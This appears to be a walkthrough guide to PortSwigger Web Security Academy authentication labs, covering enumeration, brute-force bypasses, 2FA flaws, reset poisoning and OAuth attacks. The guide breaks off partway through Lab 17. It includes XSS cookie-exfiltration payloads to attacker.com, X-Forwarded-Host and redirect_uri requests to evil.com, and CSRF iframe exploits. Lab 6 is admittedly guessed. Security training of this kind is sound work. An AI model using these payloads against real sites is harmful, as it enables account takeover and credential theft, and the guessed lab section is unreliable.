# PortSwigger Web Security Academy - Complete Authentication Labs Guide

## Table of Contents
1. [Overview of Authentication Vulnerabilities](#overview)
2. [Password-Based Authentication Labs](#password-based-labs)
3. [Multi-Factor Authentication Labs](#mfa-labs)
4. [Other Authentication Mechanisms Labs](#other-mechanisms-labs)
5. [OAuth Authentication Labs](#oauth-labs)
6. [Business Logic Authentication Labs](#business-logic-labs)
7. [Attack Techniques and Tools](#attack-techniques)
8. [Defense Mechanisms](#defense-mechanisms)
9. [Resources](#resources)

---

## Overview of Authentication Vulnerabilities {#overview}

### What Are Authentication Vulnerabilities?

Authentication vulnerabilities are critical security issues that allow attackers to gain unauthorized access to sensitive data and functionality. Authentication is the process of verifying the identity of a user or client.

### Three Authentication Factors

1. **Knowledge factors** - Something you know (passwords, security questions)
2. **Possession factors** - Physical objects (mobile phones, security tokens)
3. **Inherence factors** - Biometrics or behavioral patterns

### How Vulnerabilities Arise

- **Weak mechanisms** failing to protect against brute-force attacks
- **Logic flaws** or poor coding enabling complete authentication bypass
- **Improper implementation** of multi-factor authentication
- **Session management** vulnerabilities
- **Third-party authentication** flaws (OAuth)

### Impact

Compromised accounts expose all associated data and functionality. High-privilege account compromise enables full application control and potential infrastructure access.

---

## Password-Based Authentication Labs {#password-based-labs}

### Lab 1: Username Enumeration via Different Responses

**Difficulty:** Apprentice (foundational)

**Vulnerability Type:** Username enumeration combined with password brute-force attacks

**Description:**
The vulnerable login mechanism responds differently based on whether a username exists, allowing attackers to distinguish valid accounts from invalid ones. The system then permits brute-force password attempts against enumerated accounts.

**Step-by-Step Solution:**

#### Phase 1: Username Enumeration
1. Submit invalid credentials to observe the login response
2. Capture the POST /login request using Burp Proxy
3. Send to Intruder and configure Sniper attack mode
4. Mark the username parameter with payload delimiters
5. Load the candidate usernames list (available from Web Security Academy)
6. Execute the attack with a static password value
7. Sort by response length to identify the valid username
8. Look for "Incorrect password" message instead of "Invalid username"

#### Phase 2: Password Brute-Force
1. Replace the username with the identified valid account
2. Mark the password parameter with payload delimiters
3. Switch to the candidate passwords wordlist
4. Launch the attack
5. Look for HTTP 302 redirect response (successful login)
6. Note the password associated with the 302 response

#### Phase 3: Account Access
Log in using enumerated credentials and navigate to the user account page to complete the lab.

**Burp Suite Tools & Techniques:**
- HTTP History: Capture and review login requests
- Intruder: Automate both username enumeration and password attacks
- Simple List payload type: Inject wordlist values
- Sniper attack mode: Single-position payload injection
- Response analysis: Compare message length and content

**Key Indicators:**
- Response messages differ based on username validity
- One response length noticeably differs from others
- Successful login generates HTTP 302 status code instead of 200

**Common Pitfalls:**
- Failing to examine response content alongside HTTP status codes
- Using cluster bomb instead of sequential enumeration
- Not sorting results by response length
- Overlooking distinction between authentication failures

**HTTP Request Example:**
```http
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded

username=carlos&password=test123
```

---

### Lab 2: Username Enumeration via Subtly Different Responses

**Difficulty:** Practitioner

**Vulnerability Type:** Subtle username enumeration with brute-force

**Description:**
The application's error messages contain minor inconsistencies that reveal whether a username exists. Specifically, the error response for valid usernames differs minutely from invalid ones—in this case, containing a trailing space instead of a full stop/period.

**Step-by-Step Solution:**

#### Phase 1: Username Enumeration
1. Submit invalid credentials to observe baseline error messages
2. Set up Burp Intruder with username parameter as payload position
3. Load candidate usernames from the provided wordlist
4. Use Grep-Extract feature to isolate error message text
5. Execute attack and sort extracted messages
6. Identify the anomaly (trailing space vs. period)

#### Phase 2: Password Brute-Force
1. Add payload position to the password parameter
2. Replace username list with candidate passwords
3. Monitor for HTTP 302 redirect (successful login)
4. Capture the password triggering the successful response

#### Phase 3: Account Access
Log in with identified credentials to complete the lab.

**Burp Suite Techniques:**
- Intruder Module: Automated payload injection
- Grep-Extract Feature: Precise response content identification
- Result Sorting: Identifying anomalies in extracted data
- Simple list payload methodology

**Key Learning Point:**
This lab illustrates how seemingly minor response variations—even whitespace differences—can inadvertently leak user existence information.

**Common Mistakes:**
- Not using Grep-Extract to capture exact error text
- Overlooking subtle differences in whitespace
- Failing to compare responses systematically

---

### Lab 3: Username Enumeration via Response Timing

**Difficulty:** Practitioner

**Vulnerability Type:** Timing-based username enumeration with IP spoofing bypass

**Description:**
When a valid username is entered, the response time increases depending on the password length. Invalid usernames produce consistent response times, while valid ones vary based on password length. The application also supports the X-Forwarded-For header, enabling IP spoofing to circumvent rate limiting.

**Step-by-Step Solution:**

#### Phase 1: Reconnaissance
1. Submit invalid credentials via POST /login
2. Send request to Burp Repeater for analysis
3. Identify IP-based blocking after multiple attempts

#### Phase 2: Username Enumeration
4. Craft Pitchfork attack with:
   - X-Forwarded-For header (payload position 1: numbers 1-100)
   - username parameter (payload position 2: candidate list)
   - Password set to ~100 character string (to amplify timing differences)
5. Review results using Response received/completed columns
6. Identify username with significantly longer response time
7. Confirm consistency with repeated tests

#### Phase 3: Password Brute-Force
8. Create second Intruder attack with:
   - Spoofed IP via X-Forwarded-For
   - Valid username (from Phase 2)
   - Password list payload
9. Monitor for HTTP 302 response indicating successful login

#### Phase 4: Account Access
10. Login with enumerated credentials
11. Access user account page to complete lab

**Burp Suite Techniques:**
- Intruder Module: Pitchfork attack type
- Repeater: Manual request testing
- Column Customization: Response timing analysis
- Header Manipulation: X-Forwarded-For spoofing
- Payload Types: Numbers, username lists, password dictionaries

**Critical Considerations:**
- Response time variance correlates with password length processing only for valid usernames
- Header bypass: "This can be easily bypassed by manipulating HTTP request headers"
- Efficiency: Username enumeration precedes password brute-forcing

**HTTP Request Example with IP Spoofing:**
```http
POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 192.168.1.100
Content-Type: application/x-www-form-urlencoded

username=carlos&password=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

---

### Lab 4: Broken Brute-Force Protection, IP Block

**Difficulty:** Practitioner

**Vulnerability Type:** Logic flaw in brute-force protection

**Description:**
The lab contains a logic flaw in its password brute-force protection. The protection mechanism temporarily blocks IPs after 3 consecutive failed login attempts. However, the flaw permits resetting this counter by successfully logging in with valid credentials before reaching the threshold.

**Step-by-Step Solution:**

#### Preparation
- Test credentials provided: wiener:peter
- Target victim username: carlos
- Access candidate password list from the academy

#### Attack Configuration
1. Send a failed login attempt to Burp Intruder
2. Create a pitchfork attack with username and password parameter positions
3. Configure resource pool with "Maximum concurrent requests" set to 1
4. First payload position: alternate usernames
   - Pattern: wiener, carlos, wiener, carlos, wiener, carlos...
   - Your account first, then carlos repeated 100+ times
5. Second payload position: password list
   - Your password aligned with your username entries
   - Test passwords for carlos entries

#### Execution & Analysis
- Filter results excluding HTTP 200 responses
- Sort by username
- Locate the single 302 response corresponding to carlos
- The associated password is the target credential

#### Lab Completion
Log in using Carlos's discovered password and access the account page.

**Burp Suite Tools:**
- Intruder: Pitchfork attack mode
- Resource Pool: Manage concurrent request constraints
- Payload Positions: Coordinate multiple parameter injection points

**Advanced Alternatives:**
The hint mentions "Advanced users may want to solve this lab by using a macro or the Turbo Intruder extension"

**Payload Pattern Example:**
```
Username payload: wiener, carlos, wiener, carlos, wiener, carlos...
Password payload: peter, test1, peter, test2, peter, test3...
```

---

### Lab 5: Username Enumeration via Account Lock

**Difficulty:** Practitioner

**Vulnerability Type:** Account locking logic flaw enabling username enumeration

**Description:**
The lab contains a flaw in account locking logic. The system responds differently when too many incorrect login attempts are made on a valid account versus an invalid one, allowing enumeration of existing accounts.

**Step-by-Step Solution:**

#### Phase 1: Identify Valid Username
1. Submit invalid credentials and capture POST /login request
2. Configure Cluster Bomb attack:
   - Set attack type to "Cluster bomb"
   - Add payload position around the username parameter
   - Add blank payload position at request body's end:
     `username=§invalid-username§&password=example§§`
3. Payload configuration:
   - First position: Load candidate usernames list
   - Second position: Select "Null payloads" type, generate 5 payloads
4. Execute attack and examine response lengths
5. One username will produce longer responses containing:
   "You have made too many incorrect login attempts."
6. This indicates a valid account

#### Phase 2: Brute-Force Password
1. Create a Sniper attack on POST /login request
2. Set identified username as static value
3. Add payload position to password parameter
4. Load candidate passwords list
5. Create grep extraction rule for error messages
6. Execute attack
7. One password response will lack an error message (successful authentication)

#### Phase 3: Account Access
- Allow approximately 60 seconds for account lock reset
- Login using identified credentials
- Access user account page

**Burp Suite Tools & Techniques:**
- Intruder module (Cluster bomb and Sniper attack types)
- Payload positions and null payload generation
- Response analysis for differentiation detection
- Grep extraction rules for targeted data identification

**Key Insight:**
The logic flaw resides in how the system differentiates between valid and invalid accounts during account lockout—valid accounts trigger the lockout message, creating an enumeration vector.

**Common Mistakes:**
- Not using null payloads to repeat attempts
- Forgetting to wait for lockout reset before final login
- Missing the subtle differences in response lengths

---

### Lab 6: Broken Brute-Force Protection, Multiple Credentials Per Request

**Difficulty:** Practitioner (lab URL not accessible, but based on common patterns)

**Vulnerability Type:** JSON array parameter injection

**Description:**
This lab likely involves exploiting a login endpoint that accepts JSON and processes arrays of credentials, allowing multiple password attempts in a single request to bypass rate limiting.

**Expected Solution Pattern:**
1. Identify JSON-based login endpoint
2. Modify password parameter to accept array format
3. Send request with multiple password candidates in single array
4. Bypass per-request rate limiting

**Example Payload:**
```json
{
  "username": "carlos",
  "password": [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789"
  ]
}
```

---

## Multi-Factor Authentication Labs {#mfa-labs}

### Lab 7: 2FA Simple Bypass

**Difficulty:** Apprentice

**Vulnerability Type:** Incomplete authentication flow enforcement

**Description:**
This lab demonstrates a fundamental flaw in two-factor authentication implementation. The vulnerability allows an authenticated attacker to bypass 2FA verification by directly navigating to protected resources through URL manipulation.

**Step-by-Step Solution:**

1. **Initial authentication:** Log in with provided credentials (wiener:peter)
2. **Receive 2FA code:** Check email client for verification code
3. **URL reconnaissance:** Note the account page URL structure (typically /my-account)
4. **Logout and re-authenticate:** Sign out, then log in as victim (carlos:montoya)
5. **Bypass technique:** When 2FA verification prompt appears, manually change URL to navigate to /my-account
6. **Success condition:** The protected account page loads without completing verification

**Key Vulnerability:**
The bypass works because the application fails to enforce authentication state validation before granting access to protected resources. Users can circumvent the 2FA challenge by directly requesting the endpoint.

**Burp Suite Techniques:**
- Manual URL manipulation
- Session analysis
- Request/response observation

**Security Implications:**
This demonstrates why verification logic must verify completion status server-side, not rely on client-side navigation or user progression through expected workflows.

**Common Mistakes:**
- Trying to bypass without completing initial password authentication
- Not recognizing that URL manipulation can bypass flow controls

---

### Lab 8: 2FA Broken Logic

**Difficulty:** Practitioner

**Vulnerability Type:** Flawed parameter validation in 2FA verification

**Description:**
The lab demonstrates flawed logic in a two-factor authentication system. The core issue involves improper parameter validation in the 2FA verification process. The verify parameter—which should be immutable and tied to the authenticated user—can be manipulated to access another user's account.

**Step-by-Step Solution:**

#### Phase 1: Investigation
1. Log in using provided credentials (wiener:peter)
2. Examine the POST /login2 request during 2FA verification
3. Identify that the verify parameter controls "which user's account is being accessed"
4. Log out to prepare for exploitation

#### Phase 2: Code Generation
5. Send a GET /login2 request to Burp Repeater
6. Modify the verify parameter value from your username to carlos
7. Execute the request to trigger temporary 2FA code generation for Carlos's account

#### Phase 3: Brute-Force Attack
8. Return to login page and enter your credentials (wiener:peter)
9. Submit an invalid 2FA code to reach the verification screen
10. Capture the subsequent POST /login2 request
11. Send request to Burp Intruder
12. Configure payload injection:
    - Set verify parameter to carlos
    - Add payload position to mfa-code parameter
    - Execute brute-force attack against 2FA codes (typically 0000-9999 for 4-digit codes)

#### Phase 4: Account Access
13. Identify successful response (likely 302 redirect)
14. Load the 302 response in browser
15. Navigate to "My account" to confirm access to Carlos's account

**Burp Suite Techniques:**
- Repeater: Modify and resend requests with altered parameters
- Intruder: Automate brute-force attacks with configurable payload positions
- Response Analysis: Track status codes (302 indicates successful authentication)

**Critical Security Flaw:**
The vulnerability stems from using user-controllable parameters in authentication logic. The verify parameter should be server-side validated and tied to the actual authenticated session, not client-modifiable.

**HTTP Request Example:**
```http
POST /login2 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

mfa-code=1234&verify=carlos
```

**Common Mistakes:**
- Failing to recognize parameter manipulation opportunities
- Not understanding that 2FA codes are time-limited but numerically brute-forceable
- Neglecting to test with alternative usernames in security-critical parameters

---

### Lab 9: 2FA Bypass Using Brute-Force Attack

**Difficulty:** Practitioner

**Vulnerability Type:** Insufficient brute-force protection on 2FA codes

**Description:**
The two-factor authentication mechanism lacks sufficient protection against automated attacks. The system becomes vulnerable when attackers can repeatedly attempt verification codes without adequate rate limiting or account lockout measures that persist across sessions.

**Step-by-Step Solution:**

#### Phase 1: Investigation
1. Log in using credentials carlos:montoya
2. Examine the 2FA verification workflow
3. Note that two incorrect attempts trigger logout

#### Phase 2: Session Handling Configuration
4. Access Burp Settings → Sessions
5. Create a new Session Handling Rule
6. Set URL Scope to "Include all URLs"
7. Add a macro that records and replays these requests:
   - GET /login
   - POST /login
   - GET /login2
8. Test the macro to verify it reaches the verification code prompt

#### Phase 3: Intruder Configuration
9. Capture the POST /login2 request
10. Add payload position to the mfa-code parameter
11. Select "Numbers" payload type with settings:
    - Range: 0-9999
    - Step: 1
    - Integer digits: 4
12. Set resource pool to 1 concurrent request
13. Launch the attack

#### Phase 4: Exploitation
14. Monitor responses for a 302 status code
15. View the redirect response in browser
16. Click "My account" to complete the lab

**Key Burp Suite Techniques:**
- Macros: Automates re-authentication between requests
- Session Handling Rules: Maintains valid sessions throughout the attack
- Intruder: Systematically tests all possible 4-digit codes
- Resource Pooling: Prevents session conflicts through sequential requests

**Important Considerations:**
The instructions note that verification codes reset during attacks, potentially requiring multiple attempts before success. The macro-based approach circumvents the two-attempt logout protection by establishing fresh authenticated sessions.

**Macro Configuration Example:**
```
Step 1: GET /login (200 OK)
Step 2: POST /login with username=carlos&password=montoya (302 Redirect)
Step 3: GET /login2 (200 OK - verification prompt)
```

**Common Mistakes:**
- Not setting up macros properly for re-authentication
- Using multiple concurrent threads (causes session conflicts)
- Not understanding how the macro resets the attempt counter

---

## Other Authentication Mechanisms Labs {#other-mechanisms-labs}

### Lab 10: Brute-Forcing a Stay-Logged-In Cookie

**Difficulty:** Practitioner

**Vulnerability Type:** Predictable cookie structure with weak hashing

**Description:**
The lab features a cookie-based authentication mechanism using "stay-logged-in" cookies vulnerable to brute-force attacks. The cookie uses a predictable structure: base64(username+':'+md5HashOfPassword). The vulnerability stems from MD5 hashing combined with deterministic cookie construction.

**Step-by-Step Solution:**

#### Phase 1: Analyze Your Own Cookie
1. Log in with "Stay logged in" selected (wiener:peter)
2. Examine the stay-logged-in cookie in the Inspector panel
3. Decode the Base64 to see format: wiener:51dc30ddc473d43a6011e9ebba6ca770
4. Verify the hash component is MD5(password)
5. Hash "peter" using MD5 to confirm it matches

#### Phase 2: Configure Burp Intruder
6. Capture a GET /my-account?id=wiener request
7. Send to Burp Intruder
8. Set payload position on stay-logged-in cookie parameter
9. Add test payload "peter" to validate processing rules

#### Phase 3: Configure Payload Processing
Configure sequential payload processing rules in this exact order:
- Rule 1 - Hash: Apply MD5 hashing
- Rule 2 - Add prefix: Insert wiener: before the hash
- Rule 3 - Encode: Apply Base64 encoding

#### Phase 4: Set Up Response Analysis
10. Add grep match rule for "Update email" (appears when authenticated)
11. Run test attack with your password to confirm rules work

#### Phase 5: Attack Carlos's Account
12. Update attack parameters:
    - Replace payload with candidate password list
    - Change id parameter to carlos
    - Modify prefix rule to add carlos: instead of wiener:
13. Execute final attack
14. Exactly one response will contain "Update email"

**Burp Suite Tools:**
- Inspector Panel: Cookie examination and Base64 decoding
- Burp Intruder: Automated brute-force attack execution
- Payload Processing Rules: Sequential transformation (hash → prefix → encode)
- Grep Match: Response analysis for successful authentication

**Cookie Construction Formula:**
```
base64(username+':'+md5(password))
```

**Example Transformations:**
```
Payload: 123456
After MD5: e10adc3949ba59abbe56e057f20f883e
After Prefix: carlos:e10adc3949ba59abbe56e057f20f883e
After Base64: Y2FybG9zOmUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNl
```

**Common Mistakes:**
- Rule order matters: Processing rules execute sequentially
- Parameter changes required: Forgetting to change id parameter or prefix
- Payload list format: Ensure passwords are properly formatted
- Response indicator: Using correct string to identify successful authentication

---

### Lab 11: Offline Password Cracking

**Difficulty:** Practitioner

**Vulnerability Type:** Password hash storage in cookies + Stored XSS

**Description:**
The lab demonstrates two interconnected security flaws: user credentials stored as Base64-encoded hashes in the "stay-logged-in" cookie (username:md5HashOfPassword format) and a stored XSS vulnerability in the comment functionality. Combined, these enable attackers to steal authentication cookies and crack passwords offline.

**Step-by-Step Solution:**

#### Phase 1: Reconnaissance
1. Log in with provided credentials (wiener:peter)
2. Examine the stay-logged-in cookie in Burp Proxy HTTP history
3. Decode the Base64 cookie to reveal its structure

#### Phase 2: Cookie Theft via XSS
4. Locate the XSS vulnerability in the comment functionality
5. Craft a payload:
```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```
6. Post the payload as a comment on a blog post
7. Access the exploit server's access log to retrieve the victim's cookie

#### Phase 3: Password Cracking
8. Decode Carlos's stay-logged-in cookie in Burp Decoder
9. Extract the MD5 hash (26323c16d5f4dabff3bb136f2460a943)
10. Search the hash in a search engine or hash database
11. Identify the plaintext password (onceuponatime)

#### Phase 4: Account Deletion
12. Authenticate as carlos using the cracked password
13. Navigate to "My account" page
14. Execute account deletion to solve the lab

**Burp Suite Techniques:**
- Proxy > HTTP history: Monitor login responses
- Burp Decoder: Decode Base64-encoded cookies
- XSS exploitation: Inject malicious scripts to exfiltrate cookies
- Exploit server: Capture victim requests with stolen data

**XSS Payload Variants:**
```javascript
// Basic exfiltration
<script>document.location='//attacker.com/'+document.cookie</script>

// Using fetch
<script>fetch('//attacker.com/?c='+document.cookie)</script>

// Using image tag
<img src=x onerror="this.src='//attacker.com/?c='+document.cookie">
```

**Common Mistakes:**
- Not properly encoding the payload
- Forgetting to replace exploit server ID
- Incorrect cookie structure assumptions
- Hash searching risks: Avoid submitting real client password hashes to public search engines during actual penetration testing

---

### Lab 12: Password Reset Broken Logic

**Difficulty:** Practitioner

**Vulnerability Type:** Insufficient token validation in password reset

**Description:**
The lab demonstrates a critical flaw in password reset functionality. The vulnerability allows attackers to reset any user's password by exploiting insufficient token validation. The system fails to verify the temporary password reset token when processing password change requests.

**Step-by-Step Solution:**

#### Phase 1: Reconnaissance
1. Initiate password reset for your own account (wiener)
2. Access the reset email via the Email Client tool
3. Examine the reset link containing a URL query parameter token

#### Phase 2: Vulnerability Discovery
4. Using Burp Proxy, intercept POST request to /forgot-password?temp-forgot-password-token
5. Observe the request contains username as a hidden form field
6. Send the request to Burp Repeater for testing

#### Phase 3: Exploitation
7. In Repeater, delete the temp-forgot-password-token parameter value from both URL and request body
8. Confirm password reset still functions (proves token not being checked)
9. Repeat the process, but modify the username parameter to carlos
10. Submit the request with a new password for Carlos's account

#### Phase 4: Verification
11. Log in using Carlos's credentials with the newly set password
12. Access the "My account" page to complete the lab

**Burp Suite Tools:**
- Proxy (HTTP History): Capture and analyze password reset requests
- Repeater: Manipulate parameters and test token validation logic

**Key Technical Insight:**
The vulnerability stems from the server accepting password reset requests without validating the temporary token's association with the requesting user.

**HTTP Request Example:**
```http
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=&username=carlos&new-password=newpass123
```

**Common Mistakes:**
- Not removing both instances of the token (URL and body)
- Failing to test token validation before exploitation
- Not recognizing the username parameter manipulation opportunity

---

### Lab 13: Password Reset Poisoning via Middleware

**Difficulty:** Practitioner

**Vulnerability Type:** Header injection in password reset links

**Description:**
This lab demonstrates password reset poisoning exploiting middleware header manipulation. The application processes the X-Forwarded-Host header when generating password reset links, allowing attackers to redirect reset tokens to attacker-controlled domains.

**Step-by-Step Solution:**

#### Phase 1: Investigate Password Reset
1. Examine the password reset functionality
2. Identify how reset tokens are generated and transmitted via email

#### Phase 2: Identify Header Support
3. Send the POST /forgot-password request through Burp Repeater
4. Confirm the application honors the X-Forwarded-Host header in dynamically-generated reset links

#### Phase 3: Capture Exploit Server URL
5. Note your exploit server's domain from the Web Security Academy interface

#### Phase 4: Poison the Reset Request
6. Modify the POST request to include:
```http
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=carlos
```

#### Phase 5: Extract Victim's Token
7. Check the exploit server's access log
8. Look for incoming GET requests to /forgot-password
9. Extract the reset token from query parameters

#### Phase 6: Craft Valid Reset Link
10. Use the legitimate password reset URL structure from your own email
11. Replace the token parameter with the stolen value

#### Phase 7: Reset Target Account
12. Load the modified URL
13. Set a new password for Carlos's account

#### Phase 8: Verify Access
14. Log in using Carlos's credentials to confirm successful account compromise

**Burp Suite Tools:**
- Burp Repeater: For manipulating and resending authentication requests
- Header Injection: Modifying X-Forwarded-Host values
- Access Log Analysis: Reviewing exploit server logs for captured tokens

**Key Vulnerability Concept:**
Applications must validate the Host header origin rather than trusting proxy headers like X-Forwarded-Host when generating sensitive reset links.

**HTTP Request Example:**
```http
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: evil.com
Content-Type: application/x-www-form-urlencoded

username=victim
```

**Generated Reset Link:**
```
https://evil.com/reset?token=abc123xyz789
```

**Common Mistakes:**
- Not monitoring exploit server logs for incoming requests
- Forgetting to include the X-Forwarded-Host header
- Using incorrect exploit server domain format

---

### Lab 14: Password Brute-Force via Password Change

**Difficulty:** Practitioner

**Vulnerability Type:** Information disclosure in password change functionality

**Description:**
The lab demonstrates a flaw in password change functionality that enables password enumeration. The application provides different error messages based on validation sequence, revealing whether the current password guess was correct without triggering account lockout.

**Error Message Analysis:**
- "Current password is incorrect" → current password guess was wrong
- "New passwords do not match" → current password was CORRECT

**Step-by-Step Solution:**

#### Prerequisites
- Credentials: wiener:peter
- Target username: carlos
- Access to candidate passwords list

#### Attack Steps

**Step 1: Initial Reconnaissance**
1. Log in with provided credentials
2. Navigate to password change functionality
3. Note that username is submitted as a hidden parameter

**Step 2: Vulnerability Identification**
- Submit incorrect current password with matching new passwords → account locks
- Submit incorrect current password with mismatched new passwords → "Current password is incorrect"
- Submit correct current password with mismatched new passwords → "New passwords do not match"

**Step 3: Burp Intruder Configuration**
4. Intercept the POST /my-account/change-password request
5. Modify parameters:
```
username=carlos&current-password=§payload§&new-password-1=123&new-password-2=abc
```
6. Load candidate passwords as payload set
7. Configure grep match rule targeting "New passwords do not match"

**Step 4: Execute Attack**
8. Launch the intruder attack
9. Monitor results for the single response containing the success indicator
10. Document the discovered password

**Step 5: Account Access**
11. Log out of current session
12. Authenticate as carlos with the identified password
13. Access "My account" page to complete the lab

**Burp Suite Techniques:**
- Intruder: Password enumeration attack
- Payloads: Candidate password wordlist
- Grep Match: Response filtering for success indicators
- Parameter Manipulation: Username modification for lateral enumeration

**Key Insight:**
"The account is locked" when new passwords match, but "Current password is incorrect" when they differ—allowing safe brute-forcing without lockout triggers.

**HTTP Request Example:**
```http
POST /my-account/change-password HTTP/1.1
Host: vulnerable-website.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

username=carlos&current-password=test123&new-password-1=123&new-password-2=abc
```

**Logic Flow:**
```
1. Check if current password is correct
   - If NO: return "Current password is incorrect"
   - If YES: continue to step 2

2. Check if new passwords match
   - If NO: return "New passwords do not match"
   - If YES: change password and lock account after threshold
```

**Common Mistakes:**
- Using matching new passwords (triggers lockout)
- Not setting up proper grep match rules
- Forgetting to change username parameter to target user
- Not understanding the validation sequence

---

## OAuth Authentication Labs {#oauth-labs}

### Lab 15: Authentication Bypass via OAuth Implicit Flow

**Difficulty:** Apprentice

**Vulnerability Type:** Flawed validation in OAuth implementation

**Description:**
The lab demonstrates a critical flaw in OAuth 2.0 implementation. The client application receives user information from an OAuth service and authenticates users by submitting this data to its own endpoint. Due to flawed validation by the client application, attackers can modify user identifiers (such as email addresses) without proper server-side verification.

**Objective:**
Gain unauthorized access to Carlos's account (carlos@carlos-montoya.net) without knowing his password.

**Step-by-Step Solution:**

**Step 1: Initiate OAuth Flow**
Complete the normal OAuth login process by clicking "My account" and authenticating with provided credentials (wiener:peter).

**Step 2: Analyze OAuth Traffic**
- Navigate to Burp's "Proxy" > "HTTP history"
- Examine requests starting with authorization endpoint GET /auth?client_id=[...]
- Identify how user information flows from OAuth service back to the blog application

**Step 3: Locate Authentication Request**
Find the POST /authenticate request containing user information and the access token sent to the client application's endpoint.

**Step 4: Modify and Resend**
- Send the POST /authenticate request to Burp Repeater
- Change the email parameter from your account to carlos@carlos-montoya.net
- Submit the modified request—observe no error validation occurs

**Step 5: Execute Attack**
- Right-click the modified request
- Select "Request in browser" > "In original session"
- Copy the resulting URL and open it in your browser
- You'll be logged in as Carlos

**Burp Suite Tools:**
- Proxy HTTP History: Request/response inspection
- Repeater: Manual request modification and testing
- Request in Browser: Session-based URL execution

**Core Security Flaw:**
The application trusts client-supplied user identifiers without server-side validation, allowing email parameter tampering during OAuth token exchange.

**HTTP Request Example:**
```http
POST /authenticate HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/json

{
  "email": "carlos@carlos-montoya.net",
  "username": "carlos",
  "token": "attacker_valid_token_12345"
}
```

**Common Mistakes:**
- Not identifying the POST /authenticate endpoint
- Failing to understand OAuth flow sequence
- Not using "Request in browser" feature correctly

---

### Lab 16: Forced OAuth Profile Linking

**Difficulty:** Practitioner

**Vulnerability Type:** CSRF in OAuth profile linking (missing state parameter)

**Description:**
The lab demonstrates a CSRF vulnerability in OAuth profile linking. The application allows users to attach social media profiles to their accounts but fails to implement proper CSRF protection. The GET /auth?client_id[...] request does not include a state parameter to protect against CSRF attacks.

**Credentials:**
- Blog account: wiener:peter
- Social media account: peter.wiener:hotdog

**Step-by-Step Solution:**

#### Phase 1: Understand the OAuth Flow
1. Log into the blog website using the classic login form
2. Navigate to the account attachment feature ("Attach a social profile")
3. Complete the OAuth flow with your social media credentials
4. Log out and verify you can log back in via "Log in with social media"

#### Phase 2: Identify the Vulnerability
5. Analyze the proxy traffic for the attachment requests
6. Locate the /oauth-linking?code=[...] endpoint
7. Critical observation: Confirm the absence of a state parameter

#### Phase 3: Capture the Authorization Code
8. Enable Burp proxy interception
9. Initiate the "Attach a social profile" flow
10. Intercept the request containing GET /oauth-linking?code=[...]
11. Copy the complete URL
12. Drop the request (preventing code consumption, ensuring it remains valid)

#### Phase 4: Craft the CSRF Exploit
13. Access the exploit server
14. Create an HTML page containing an iframe:
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
```

#### Phase 5: Deliver and Exploit
15. Deliver the exploit to the victim (admin)
16. When the admin loads the page, their browser executes the iframe in their authenticated session
17. This automatically completes the OAuth flow, linking your social profile to their account

#### Phase 6: Gain Admin Access
18. Log back into the blog website
19. Click "Log in with social media"
20. You are now logged in as the admin user
21. Navigate to the admin panel
22. Delete the user account carlos to complete the lab

**Key Burp Suite Techniques:**
- Proxy History Analysis: Examine request sequences to identify missing security parameters
- Request Interception: Capture specific requests in the OAuth flow
- URL Copying: Extract complete URIs for exploit construction

**Security Root Cause:**
The vulnerability stems from the omission of the state parameter—a recommended CSRF protection mechanism in OAuth 2.0. This parameter should contain a unique, unpredictable value that the client verifies upon redirect.

**Exploit Code Example:**
```html
<!DOCTYPE html>
<html>
<body>
<iframe src="https://0a1f00e1038e7c3d801234567890abcd.web-security-academy.net/oauth-linking?code=aBcDeFgHiJkLmNoPqRsTuVwXyZ123456"></iframe>
</body>
</html>
```

**Common Mistakes:**
- Failing to drop the intercepted request (consuming the authorization code)
- Miscopying the authorization code or redirect URI
- Not confirming the absence of the state parameter before proceeding

---

### Lab 17: OAuth Account Hijacking via redirect_uri

**Difficulty:** Practitioner

**Vulnerability Type:** Improper redirect_uri validation

**Description:**
The lab demonstrates a misconfiguration in an OAuth provider that enables attackers to steal authorization codes associated with other users' accounts. The core issue involves improper validation of the redirect_uri parameter, allowing attackers to redirect authorization codes to external domains under their control.

**Step-by-Step Solution:**

#### Initial Reconnaissance (Steps 1-2)
1. Log in via OAuth using provided credentials (wiener:peter)
2. Observe that subsequent logins authenticate instantly due to existing OAuth sessions

#### Exploitation Setup (Steps 3-5)
3. Identify the authorization request (GET /auth?client_id=[...]) in proxy history
4. Send this request to Burp Repeater
5. Modify redirect_uri to point to the exploit server
6. Verify authorization codes appear in the exploit server's access log

#### Payload Creation (Steps 6-7)
7. Create an iframe embedding an authorization request pointing to your exploit server:
```html
<iframe src="https://oauth-server.com/auth?client_id=CLIENT_ID&redirect_uri=https://YOUR-EXPLOIT-SERVER.com&response_type=code&scope=openid%20profile%20email"></iframe>
```
8. Deploy this at /exploit endpoint
9. Confirm code leakage through access logs

#### Account Takeover (Steps 8-9)
10. Deliver exploit to victim (admin user)
11. Capture the admin's leaked authorization code from logs
12. Navigate to /oauth-callback?code=STOLEN-CODE
13. Automatically authenticate as admin and delete the carlos user

**Burp Suite Tools:**
- Proxy: Monitor OAuth flow and capture traffic
- Repeater: Manipulate authorization requests and test parameter validation
- Access logs: Verify successful code exfiltration

**Critical Techniques:**
1. Redirect URI manipulation - Exploiting insufficient validation
2. Iframe-based attack - Forcing victim interactions with malicious authorization requests
3. Authorization code interception - Capturing codes before legitimate client receives them

**HTTP Request Example:**
```http
GET /auth?client_id=abc123&redirect_uri=https://evil.com&response_type=code&scope=openid HTTP/1.1
Host: oauth-server.com
```

**Common Pitfalls:**
